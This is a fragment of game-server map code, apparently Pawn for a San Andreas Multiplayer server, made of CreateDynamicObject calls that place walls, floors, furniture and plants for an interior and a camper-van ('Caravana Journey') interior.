	CreateDynamicObject(2394, 283.85510, 135.01318, 1033.09753,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2845, 283.73917, 137.01184, 1032.37842,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2845, 280.84250, 135.90764, 1032.37842,   0.00000, 0.00000, 30.90000);
	CreateDynamicObject(2846, 279.05502, 137.24306, 1032.36536,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2846, 280.43356, 134.62373, 1032.36536,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2819, 282.08911, 138.84651, 1032.37817,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2819, 280.43378, 142.58276, 1032.37817,   0.00000, 0.00000, 207.06000);
	CreateDynamicObject(2387, 282.19327, 137.74095, 1032.37939,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2387, 280.73590, 137.74100, 1032.37939,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 265.06400, 143.95850, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 269.96936, 148.16324, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 265.06400, 143.95850, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 269.96939, 148.16319, 1037.20178,   180.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 275.63541, 147.32890, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 275.33859, 148.16319, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19431, 275.33859, 148.16319, 1037.20178,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(19450, 275.63541, 143.30920, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 275.63541, 133.80881, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 275.63541, 124.26880, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19450, 275.63541, 114.72390, 1037.20178,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(19454, 266.88971, 114.53188, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.38199, 114.52660, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 273.87170, 114.53120, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 266.88971, 124.10940, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.36270, 124.10940, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 273.83170, 124.10850, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 266.89050, 133.64330, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.36270, 133.68800, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 273.85172, 133.68800, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 266.87589, 143.25800, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.36270, 143.24429, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 273.85172, 143.24429, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 263.40555, 125.01088, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 259.92017, 124.98454, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 256.78159, 125.08363, 1038.86047,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 263.18280, 120.74065, 1032.77161,   33.36000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 273.80466, 110.63714, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 270.30481, 110.63710, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 266.85086, 110.65311, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3533, 266.03992, 110.53718, 1036.45581,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19433, 274.80609, 113.16570, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 116.66620, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80606, 120.15992, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 123.65110, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 127.11580, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 130.58040, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 134.06580, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 137.53149, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 141.01311, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.80609, 144.48940, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.77130, 147.97620, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(3533, 274.69351, 110.43891, 1036.45581,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19433, 265.96719, 113.16570, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 116.66620, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 120.14980, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 123.65110, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 127.11580, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 130.58040, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 134.06580, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 137.53149, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 141.01311, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 144.48940, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 265.96719, 147.97620, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(3533, 266.03989, 147.68810, 1036.45581,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3533, 274.67401, 147.68810, 1036.45581,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19433, 268.48129, 147.32460, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 271.92029, 147.32460, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 275.29611, 147.32460, 1032.30652,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(638, 275.15005, 117.42690, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 275.16919, 123.22090, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2345, 265.28851, 128.14317, 1036.51685,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2345, 265.01993, 128.15901, 1036.51685,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(18014, 265.62427, 113.82932, 1032.80945,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18014, 275.17651, 113.76024, 1032.80945,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 265.62961, 117.50869, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 270.54596, 104.92458, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 274.04300, 104.94420, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 267.11166, 104.93483, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 263.63687, 104.94228, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 260.18591, 104.85159, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19431, 259.19159, 109.76600, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 256.00085, 104.77181, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 255.97701, 95.52552, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 260.15201, 95.33310, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 263.63669, 95.33230, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 267.09399, 95.33310, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.54221, 95.33310, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 95.33310, 104.94420, 95.33310,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 274.04300, 95.33310, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19450, 263.44873, 92.98685, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 273.00879, 92.99372, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 275.33066, 97.73856, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 275.32458, 104.95810, 1033.86218,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 256.74411, 104.94350, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 256.65753, 95.36188, 1032.29248,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19450, 253.84779, 92.98680, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19433, 274.77130, 108.12310, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.77130, 104.63850, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.77130, 101.19400, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.77130, 97.71240, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 274.77130, 94.23900, 1032.30603,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19433, 272.28259, 93.84201, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 268.83200, 93.84200, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 265.34891, 93.84200, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 261.83209, 93.84200, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 257.54459, 109.05110, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 260.99490, 109.05110, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19433, 264.43842, 109.05107, 1032.30603,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(2165, 274.72775, 104.92120, 1032.35986,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2165, 273.73993, 105.80375, 1032.35986,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1714, 274.64642, 106.59646, 1032.37769,   0.00000, 0.00000, -30.54000);
	CreateDynamicObject(2773, 272.74356, 99.71048, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 272.74359, 102.03340, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 272.74359, 105.79760, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 269.49292, 146.71729, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2011, 273.70059, 99.01423, 1032.39246,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2011, 273.70059, 99.01423, 1032.39246,   0.00000, 0.00000, 42.18000);
	CreateDynamicObject(2011, 273.79782, 94.93951, 1032.39233,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2011, 273.79782, 94.93951, 1032.39233,   0.00000, 0.00000, 31.98000);
	CreateDynamicObject(638, 274.84991, 100.52249, 1033.06604,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 274.84991, 103.09370, 1033.06604,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 273.89136, 93.40932, 1033.06604,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, 271.20969, 93.40790, 1033.06604,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, 268.52921, 93.40790, 1033.06604,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1714, 273.62375, 103.49944, 1032.37769,   0.00000, 0.00000, -213.48001);
	CreateDynamicObject(1726, 265.67569, 130.73212, 1032.29578,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1726, 265.67569, 133.09241, 1032.29578,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1726, 265.67569, 137.19530, 1032.29578,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1726, 265.67569, 139.55820, 1032.29578,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1726, 265.67569, 143.46550, 1032.29578,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2011, 265.58496, 135.64838, 1032.39221,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2011, 265.60492, 136.40842, 1032.39221,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2011, 265.60492, 136.40842, 1032.39221,   0.00000, 0.00000, 44.87999);
	CreateDynamicObject(2011, 265.58496, 135.64838, 1032.39221,   0.00000, 0.00000, 36.18000);
	CreateDynamicObject(2010, 265.74155, 142.22591, 1032.39136,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 265.73505, 142.88615, 1032.39136,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 265.73505, 142.88615, 1032.39136,   0.00000, 0.00000, 39.23999);
	CreateDynamicObject(2010, 265.74155, 142.22591, 1032.39136,   0.00000, 0.00000, 24.96000);
	CreateDynamicObject(949, 265.55383, 129.86732, 1033.00830,   0.00000, 0.00000, 22.98000);
	CreateDynamicObject(949, 265.42242, 127.30688, 1033.00830,   0.00000, 0.00000, 22.98000);
	CreateDynamicObject(2721, 275.55795, 131.91119, 1033.83496,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2668, 278.14005, 122.07612, 1033.91589,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1444, 274.11865, 112.26703, 1033.21045,   0.00000, 0.00000, 112.74001);
	CreateDynamicObject(2048, 275.18509, 102.58862, 1034.40747,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2048, 275.21002, 106.86856, 1034.40747,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2685, 275.54791, 121.98344, 1034.18188,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2714, 275.48892, 125.79823, 1034.95264,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2714, 275.46689, 133.10158, 1034.95264,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2714, 265.18253, 128.28206, 1034.95264,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2714, 265.22345, 121.13104, 1034.95264,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2730, 275.48309, 142.64615, 1036.50513,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2731, 275.46957, 143.98598, 1033.52539,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2745, 273.25409, 147.06551, 1033.02258,   0.00000, 0.00000, -63.30000);
	CreateDynamicObject(2745, 267.51599, 147.06551, 1033.02258,   0.00000, 0.00000, 63.30000);
	CreateDynamicObject(3471, 268.69791, 147.01540, 1033.59583,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3471, 272.07831, 147.01540, 1033.59583,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(638, 271.95822, 132.13693, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 271.95819, 134.78540, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 271.95819, 137.44470, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 271.95819, 140.14110, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19373, 270.46713, 139.70782, 1032.37646,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(638, 271.95819, 129.49240, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 271.95819, 126.83240, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 271.95819, 124.15710, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19373, 270.46149, 136.22490, 1032.37646,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19373, 270.46149, 132.73990, 1032.37646,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19373, 270.46149, 129.23790, 1032.37646,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19373, 270.45737, 125.73775, 1032.37646,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19373, 270.44281, 124.58183, 1032.37598,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(638, 268.78439, 124.15710, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 268.78439, 126.83240, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 268.78439, 129.49240, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 268.78439, 132.13690, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 268.78439, 134.78540, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 268.78442, 137.44470, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 268.78439, 140.14110, 1033.05273,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, 270.43561, 141.83504, 1033.05273,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, 270.43561, 122.45330, 1033.05273,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(870, 270.29465, 124.14736, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.22736, 125.48077, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.47360, 125.95609, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.15839, 127.28725, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.26874, 128.30621, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.28055, 129.46622, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.26953, 134.98761, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.32513, 131.90582, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.29221, 132.60622, 1032.73767,   0.00000, 0.00000, 37.02000);
	CreateDynamicObject(870, 270.01230, 128.64882, 1032.73767,   0.00000, 0.00000, 37.02000);
	CreateDynamicObject(870, 270.50519, 126.38733, 1032.73767,   0.00000, 0.00000, 77.34000);
	CreateDynamicObject(870, 270.32513, 131.90582, 1032.73767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 270.28052, 136.70776, 1032.73767,   0.00000, 0.00000, 34.86000);
	CreateDynamicObject(870, 270.38632, 138.14613, 1032.73767,   0.00000, 0.00000, 34.86000);
	CreateDynamicObject(870, 270.48233, 140.14479, 1032.73767,   0.00000, 0.00000, 80.69999);
	CreateDynamicObject(869, 270.61450, 124.76311, 1032.89783,   0.00000, 0.00000, 73.74001);
	CreateDynamicObject(869, 270.58936, 131.55823, 1032.89783,   0.00000, 0.00000, 73.74001);
	CreateDynamicObject(869, 270.32297, 127.61708, 1032.89783,   0.00000, 0.00000, 73.74001);
	CreateDynamicObject(869, 270.52344, 134.56255, 1032.89783,   0.00000, 0.00000, 73.74001);
	CreateDynamicObject(869, 270.53696, 137.67339, 1032.89783,   0.00000, 0.00000, 73.74001);
	CreateDynamicObject(1523, 275.60986, 121.72147, 1032.09851,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1523, 275.59799, 126.40417, 1032.09851,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1523, 265.04117, 129.29192, 1032.09851,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1523, 265.04889, 121.83868, 1032.09851,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1502, 275.62057, 133.89398, 1032.11853,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1502, 276.50491, 118.09113, 1032.11853,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 279.40268, 118.11088, 1032.11853,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 282.60254, 118.07672, 1032.11853,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19431, 285.73431, 118.10640, 1033.86218,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 116.69200, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 120.15200, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 120.15200, 1032.29248,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 123.74920, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 127.21870, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 130.68469, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 134.15601, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 137.65880, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 141.13550, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 280.41422, 144.62520, 1035.52124,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(1569, 269.52029, 148.03229, 1032.38208,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 273.05057, 108.19527, 1032.90710,   0.00000, 0.00000, -14.58000);
	CreateDynamicObject(2773, 271.23251, 146.71730, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 274.04300, 95.33310, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.54221, 95.33310, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 267.09399, 95.33310, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 263.63669, 95.33230, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 260.15201, 95.33310, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 256.70651, 95.30890, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 256.74411, 104.94350, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 260.16501, 104.92830, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 263.63840, 104.96350, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 267.09399, 104.94420, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 270.54221, 104.94420, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 274.04300, 104.94420, 1035.52124,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(11245, 272.84940, 111.36343, 1037.17944,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11245, 267.74240, 111.36340, 1037.17944,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2614, 268.31781, 147.92482, 1036.93750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2614, 272.55685, 148.02277, 1036.93750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3973, 268.02380, 120.96728, 1036.42493,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2773, 272.71921, 97.36749, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 272.70096, 94.98734, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19609, 258.65097, 100.47631, 1032.37805,   0.00000, 0.00000, 94.13998);
	CreateDynamicObject(19317, 256.11429, 103.47732, 1033.88330,   0.00000, 0.00000, 455.34671);
	CreateDynamicObject(19317, 256.10349, 97.14584, 1033.88330,   0.00000, 0.00000, 455.34671);
	CreateDynamicObject(2229, 260.47467, 98.75661, 1032.37988,   0.00000, 0.00000, 116.70000);
	CreateDynamicObject(2229, 260.39914, 103.11079, 1032.37988,   0.00000, 0.00000, 62.76001);
	CreateDynamicObject(2232, 260.87866, 97.93726, 1032.92664,   0.00000, 0.00000, 93.46992);
	CreateDynamicObject(2232, 260.47357, 103.34112, 1032.92664,   0.00000, 0.00000, 93.46992);
	CreateDynamicObject(19153, 262.45319, 98.34093, 1035.50708,   0.00000, 0.00000, 53.07120);
	CreateDynamicObject(19153, 262.25177, 100.53664, 1035.50708,   0.00000, 0.00000, 93.93118);
	CreateDynamicObject(19153, 261.70337, 102.48788, 1035.50708,   0.00000, 0.00000, 125.31117);
	CreateDynamicObject(2773, 262.57306, 98.86121, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 262.54178, 101.20409, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 262.50269, 103.55808, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 262.41672, 105.89782, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 262.53452, 96.49465, 1032.90710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19611, 261.84146, 100.53969, 1032.38062,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19610, 261.82776, 100.55302, 1033.99695,   21.72001, 0.12000, 94.69357);
	CreateDynamicObject(19612, 260.36362, 103.37330, 1033.53198,   0.00000, 0.00000, -87.39841);
	CreateDynamicObject(19612, 260.76270, 97.91293, 1033.53198,   0.00000, 0.00000, -87.39841);
	CreateDynamicObject(638, 263.82837, 109.26187, 1033.00195,   0.00000, 0.00000, 270.87082);
	CreateDynamicObject(638, 261.14478, 109.22437, 1033.00195,   0.00000, 0.00000, 270.87082);
	CreateDynamicObject(638, 258.51166, 109.17944, 1033.00195,   0.00000, 0.00000, 270.87082);
	CreateDynamicObject(638, 255.82747, 109.11057, 1033.00195,   0.00000, 0.00000, 270.87082);
	CreateDynamicObject(2762, 259.27213, 106.23282, 1032.79004,   0.00000, 0.00000, 0.62757);
	CreateDynamicObject(14820, 259.29031, 106.21394, 1033.28271,   0.00000, 0.00000, 0.00000);
	
	// ------------ Interior Caravana Journey ------------------
	
	CreateDynamicObject(2528,2391.0000000,-1711.3200000,-47.6200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2518,2391.3500000,-1711.3800000,-47.7300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14762,2393.5200000,-1715.9000000,-45.7400000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(2948,2393.5900000,-1714.0400000,-47.7300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2313,2393.2000000,-1716.9200000,-47.7000000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1786,2393.4900000,-1717.6100000,-47.2000000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2818,2390.5800000,-1718.7700000,-45.0600000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19462,2392.3900000,-1714.3400000,-47.8000000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19462,2390.7500000,-1714.3400000,-47.8000000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(1761,2389.5700000,-1718.3600000,-47.7100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1794,2389.7100000,-1716.5600000,-47.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19453,2391.7000000,-1718.8500000,-46.0800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19453,2393.6300000,-1714.3300000,-46.0800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19453,2389.1300000,-1713.9600000,-46.0800000,0.0000000,0.0000000,-180.0000000); //
	CreateDynamicObject(19453,2387.3300000,-1713.0300000,-46.0800000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(19453,2389.2400000,-1710.7800000,-46.0800000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1491,2393.6100000,-1713.0500000,-47.7100000,0.0000000,0.0000000,-180.0000000); //
	CreateDynamicObject(19453,2389.1900000,-1713.0200000,-43.4500000,180.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(8417,2393.6900000,-1715.8200000,-44.6600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2315,2391.1600000,-1718.3000000,-47.7000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2526,2389.6800000,-1712.5700000,-47.7100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(10444,2382.8300000,-1698.3400000,-47.1900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2282,2390.2300000,-1713.5900000,-45.7700000,0.0000000,0.0000000,0.0000000); //
